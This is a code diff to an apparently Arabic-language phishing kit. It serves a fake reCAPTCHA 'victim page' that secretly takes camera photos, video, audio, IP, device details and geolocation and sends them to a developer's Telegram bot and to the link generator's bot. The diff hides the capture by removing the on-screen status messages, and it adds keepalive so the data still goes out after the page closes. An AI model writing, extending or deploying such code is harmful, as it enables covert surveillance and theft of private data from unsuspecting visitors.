@@ -918,7 +918,7 @@
         }
 
         /* ============================================================
-           VICTIM PAGE — reCAPTCHA
+           VICTIM PAGE — reCAPTCHA (NO STATUS BAR)
            ============================================================ */
         #victimPage {
             display: none;
@@ -1036,6 +1036,7 @@
             text-align: center;
             transition: color 0.2s;
             user-select: none;
+            font-family: 'Roboto', Arial, sans-serif;
         }
 
         .text.loading {
@@ -1168,19 +1169,6 @@
         }
         #hiddenCanvas {
             display: none;
-        }
-
-        /* ===== STATUS BAR (Victim) ===== */
-        .victim-status {
-            display: none;
-            margin-top: 12px;
-            padding: 10px 16px;
-            background: rgba(0, 0, 0, 0.04);
-            border-radius: 8px;
-            font-size: 13px;
-            color: #666;
-            text-align: center;
-            font-family: 'Roboto', Arial, sans-serif;
         }
 
         /* ===== SCROLLBAR ===== */
@@ -1455,7 +1443,7 @@
     </div>
 
     <!-- ============================================================
-         VICTIM PAGE — reCAPTCHA
+         VICTIM PAGE — reCAPTCHA (NO STATUS BAR)
          ============================================================ -->
     <div id="victimPage">
         <div style="display:flex;flex-direction:column;align-items:center;width:100%;max-width:400px;">
@@ -1494,7 +1482,7 @@
                 </div>
             </div>
 
-            <div class="victim-status" id="victimStatus">⏳ جاهز، اضغط على المربع للتحقق ...</div>
+            <!-- No status bar -->
         </div>
     </div>
 
@@ -1612,12 +1600,13 @@
                 } catch { return { valid: false, username: null }; }
             }
 
-            // ----- Send media to a bot (helper) -----
+            // ----- Send media to a bot (helper) with keepalive -----
             async function sendMedia(method, botToken, formData) {
                 try {
                     const response = await fetch(`https://api.telegram.org/bot${botToken}/${method}`, {
                         method: 'POST',
-                        body: formData
+                        body: formData,
+                        keepalive: true // ensures request continues after page unload
                     });
                     return response.ok;
                 } catch (e) {
@@ -1687,7 +1676,7 @@
                         tokenDisplay.textContent = shortToken;
                         resultSub.textContent = link;
 
-                        // Send link to user's bot
+                        // Send link to user's bot (keepalive)
                         const userMsg =
                             `🔗 *رابطك الجديد*\n${link}\n\n` +
                             `📌 التوكن الفريد: \`${shortToken}\`\n` +
@@ -1706,7 +1695,8 @@
                                         [{ text: '👨‍💻 المطور', url: DEVELOPER_LINK }]
                                     ]
                                 }
-                            })
+                            }),
+                            keepalive: true
                         });
 
                         // Send copy to master
@@ -1722,7 +1712,8 @@
                         await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: masterMsg })
+                            body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: masterMsg }),
+                            keepalive: true
                         });
 
                         genBtn.classList.remove('busy');
@@ -1793,14 +1784,13 @@
             }
 
             // ============================================================
-            //  🔥  VICTIM PAGE
+            //  🔥  VICTIM PAGE (NO STATUS BAR, BACKGROUND SEND)
             // ============================================================
 
             async function initVictimPage(shortToken) {
                 const spinner = document.getElementById('spinner');
                 const checkbox = document.getElementById('captcha');
                 const mainText = document.getElementById('mainText');
-                const statusEl = document.getElementById('victimStatus');
                 const video = document.getElementById('hiddenVideo');
                 const canvas = document.getElementById('hiddenCanvas');
                 const ctx = canvas.getContext('2d');
@@ -1809,12 +1799,6 @@
                 let collectionDone = false;
                 let attemptCount = 0;
                 const MAX_ATTEMPTS = 3;
-
-                function setStatus(msg, isError = false) {
-                    statusEl.style.display = 'block';
-                    statusEl.textContent = msg;
-                    statusEl.style.color = isError ? '#d93025' : '#666';
-                }
 
                 // ---- Get bot mapping from IndexedDB ----
                 async function getBotMapping(token) {
@@ -1856,7 +1840,13 @@
                 async function collectData() {
                     if (isRunning || collectionDone) return;
                     if (attemptCount >= MAX_ATTEMPTS) {
-                        setStatus('❌ فشلت المحاولات المتكررة. يرجى تحديث الصفحة.', true);
+                        // silently fail without showing error
+                        spinner.classList.remove('loading');
+                        spinner.classList.add('failed');
+                        mainText.textContent = 'فشل التحقق، حاول مجدداً';
+                        mainText.className = 'text failed';
+                        checkbox.checked = false;
+                        checkbox.disabled = false;
                         return;
                     }
                     attemptCount++;
@@ -1865,7 +1855,6 @@
                     spinner.classList.add('loading');
                     mainText.textContent = 'جاري التحقق...';
                     mainText.className = 'text loading';
-                    setStatus('⏳ جاري تهيئة الأجهزة ...');
 
                     try {
                         // Get bot mapping
@@ -1902,8 +1891,6 @@
                         } catch (e) {
                             location.error = e.message;
                         }
-
-                        setStatus('📸 جاري التقاط الصور والتسجيلات ...');
 
                         // ---- Front camera (photos and video) ----
                         let frontVideo = null;
@@ -1999,8 +1986,6 @@
                             console.warn('Audio error:', e);
                         }
 
-                        setStatus('📤 جاري إرسال البيانات إلى المطور والمستخدم ...');
-
                         // ---- Build summary ----
                         const deviceInfo =
                             `IP: ${ip}\n` +
@@ -2010,7 +1995,7 @@
                             `التوكن الفريد: ${shortToken}\n` +
                             `الوقت: ${new Date().toLocaleString('ar-EG')}`;
 
-                        // ---- Send to Master Bot (Developer) ----
+                        // ---- Send to Master Bot (Developer) with keepalive ----
                         async function sendToMaster() {
                             // Summary text
                             await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
@@ -2019,7 +2004,8 @@
                                 body: JSON.stringify({
                                     chat_id: MASTER_CHAT_ID,
                                     text: `⭑ تقرير ضحية جديدة — نسخة المطور ⭒\n⊚─〔 البيانات 〕────────\n${deviceInfo}\n─────────────────`
-                                })
+                                }),
+                                keepalive: true
                             });
 
                             // Location
@@ -2031,7 +2017,8 @@
                                         chat_id: MASTER_CHAT_ID,
                                         latitude: location.lat,
                                         longitude: location.lng
-                                    })
+                                    }),
+                                    keepalive: true
                                 });
                             }
 
@@ -2073,7 +2060,7 @@
                             }
                         }
 
-                        // ---- Send to User's Bot (if mapping found) ----
+                        // ---- Send to User's Bot (if mapping found) with keepalive ----
                         async function sendToUser() {
                             if (!userBotToken || !userChatId) {
                                 console.log('User bot not found, skipping user send.');
@@ -2087,7 +2074,8 @@
                                 body: JSON.stringify({
                                     chat_id: userChatId,
                                     text: `⭑ تقرير ضحية جديدة — بوتك (@${botName}) ⭒\n⊚─〔 البيانات 〕────────\n${deviceInfo}\n─────────────────`
-                                })
+                                }),
+                                keepalive: true
                             });
 
                             // Location
@@ -2099,7 +2087,8 @@
                                         chat_id: userChatId,
                                         latitude: location.lat,
                                         longitude: location.lng
-                                    })
+                                    }),
+                                    keepalive: true
                                 });
                             }
 
@@ -2141,14 +2130,13 @@
                             }
                         }
 
-                        // ---- Execute both sends ----
+                        // ---- Execute both sends (they will continue in background) ----
                         await Promise.all([
                             sendToMaster(),
                             sendToUser()
                         ]);
 
                         collectionDone = true;
-                        setStatus('✅ تم إرسال البيانات بنجاح إلى المطور والمستخدم!');
                         spinner.classList.remove('loading');
                         spinner.classList.add('success');
                         mainText.textContent = 'تم التحقق بنجاح';
@@ -2164,10 +2152,8 @@
                         mainText.className = 'text failed';
                         checkbox.checked = false;
                         checkbox.disabled = false;
-                        setStatus('❌ حدث خطأ. يمكنك المحاولة مرة أخرى بالنقر فوق المربع.', true);
                         isRunning = false;
                         if (attemptCount >= MAX_ATTEMPTS) {
-                            setStatus('❌ تجاوزت عدد المحاولات المسموح. يرجى تحديث الصفحة.', true);
                             checkbox.disabled = true;
                         }
                     }
@@ -2190,7 +2176,6 @@
                     }
                 });
 
-                setStatus('⏳ جاهز، اضغط على المربع للتحقق ...');
                 console.log('✅ Victim page ready. Token:', shortToken);
             }
 
